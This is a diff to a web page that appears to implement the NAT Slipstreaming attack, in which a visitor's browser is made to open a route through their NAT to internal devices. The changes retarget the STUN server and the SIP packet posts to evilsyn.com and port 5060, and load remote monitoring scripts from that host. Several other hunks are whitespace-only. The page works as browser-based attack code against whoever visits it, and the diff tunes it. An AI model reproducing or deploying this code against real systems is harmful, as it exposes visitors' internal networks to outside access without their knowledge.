@@ -21,7 +21,7 @@
 
 <p>
 please run:<br>
-<?php
+<?php 
 $port = @$_GET['port'] ? $_GET['port'] : 3306;
 $port = preg_replace("/[^0-9]/", "", $port); // to fix the xss issue
 ?>
@@ -42,7 +42,7 @@ then hit the button below<br>
 function q2d($ip)
 {
 	$ips = explode (".", $ip);
-	return ($ips[3] + $ips[2] * 256 + $ips[1] * 256 * 256 + $ips[0] * 256 * 256 * 256);
+	return ($ips[3] + $ips[2] * 256 + $ips[1] * 256 * 256 + $ips[0] * 256 * 256 * 256); 
 }
 $ip = q2d(getenv('REMOTE_ADDR'));
 ?>
@@ -100,7 +100,7 @@ var offerOptions = {offerToReceiveAudio: 1}
 var ip_dups = {}
 var pc
 var port
-var stun = "stun:samy.pl:3478"
+var stun = "stun:evilsyn.com:3478"
 	//"iceServers": [ { "urls": [stun], "username": "samy", "credential": "samy" } ],
 var config = {
 	//"iceServers": [ { "urls": [stun] } ],
@@ -343,22 +343,20 @@ function maxpktsize()
 		pkt += PAD
 	pkt += 'END_SAMY_MAXPKTSIZE'
 
+	getSize()
 
 	// note 'packet_size' length is critical, must be same as other post
 	log('responding to SYN with maximum segment size TCP option to control data size')
-	post("http://evilsyn.com:5061/samy_pktsiz", pkt, 1)
+	post("http://evilsyn.com:5060/samy_pktsiz", pkt, 1)
 	log('sending TCP beacon to detect maximum packet size and MTU')
-
-	getSize()
 }
 
 function getSize()
 {
 	var scr = document.createElement('script')
 	scr.type = 'text/javascript'
-	scr.src = 'http://evilsyn.com/slipstream/get_size.php?id=' + rand + '&rand=' + rnd()
+	scr.src = '//evilsyn.com/slipstream/get_size.php?id=' + rand + '&rand=' + rnd()
 	log('requesting sniffed packet sizes from server')
-	log(scr.src)
 	document.head.appendChild(scr)
 }
 
@@ -376,7 +374,6 @@ function addScript(url)
 	var scr = document.createElement('script')
 	scr.type = 'text/javascript'
 	scr.src = url
-	log(scr.src)
 	document.head.appendChild(scr)
 }
 
@@ -446,7 +443,7 @@ function offset(off, data, origoff)
 				lastOff = off
 
 			log("packet size changed on us, reattempt SIP REGISTER")
-			addScript('http://evilsyn.com/slipstream/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+			addScript('//evilsyn.com/slipstream/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 			attemptPin(fullpkt)
 		}
 	}
@@ -471,7 +468,7 @@ function offset(off, data, origoff)
 			else
 				log("<br><b>status:</b> ip in returned SIP packet is <b>" + ip + "</b> is no different than what we sent, NAT likely does not have ALG enabled for TCP SIP<br>")
 		}
-
+		
 		if (ip != internal || !scanForLocalip)
 			tryConnect()
 		else
@@ -543,7 +540,7 @@ function runpin()
 			tryConnect()
 			return
 		}
-		internal = possibleIps.shift()
+		internal = possibleIps.shift()	
 		log('trying potential internal ip <b>' + internal + '</b>')
 	}
 	port = document.getElementById('port').value
@@ -576,7 +573,7 @@ function runpin()
 	fullpkt = s
 
 	// get our sip request from the server, calls offset() if good, otherwise noRespTimer will likely hit
-	addScript('http://evilsyn.com/slipstream/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+	addScript('//evilsyn.com/slipstream/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 
 	// if we don't get request in a few seconds, something wrong...maybe wrong internal ip if safari
 	noRespTimer = setTimeout(noResponse, 5000)
@@ -681,7 +678,7 @@ function startStun()
 	{
     if (window.location.protocol === 'https:')
       setTimeout(function() { gohttp() }, 1000)
-		if (internal) // odd, this should have been cleared by candidate
+		if (internal) // odd, this should have been cleared by candidate	
 		{
 			log("weird, somehow got internal ip " + internal + ", continuing")
 			checkButton()
@@ -723,7 +720,7 @@ function go(type)
 
 function nlog(str)
 {
-	post('http://evilsyn.com/slipsream/nlog.php', str)
+	post('//evilsyn.com/slipstream/nlog.php', str)
 }
 function gather(sc)
 {
@@ -783,7 +780,7 @@ function handleCandidate(candidate)
 	}
 	var ip = ips[1]
 	console.log('can', candidate, JSON.stringify(candidate))
-
+	
 	// remove duplicates
 	if (ip_dups[ip] === undefined)
 	{
@@ -872,7 +869,7 @@ function scanForIP(forced)
 	setTimeout(function() {
 		setInterval(scanClass, scanBlocksMs)
 	}, delayScan)
-
+	
 	setTimeout(checkButton, delayScan + scanBlocksMs * (256 / scanInBlocks))
 	//internal = prompt("Sorry, this won't work in Safari without knowing your *internal* ip - please enter it here")
 	//internal = internal.replace(' ', '')
@@ -1035,4 +1032,3 @@ start()
 </script>
 </body>
 </html>
-
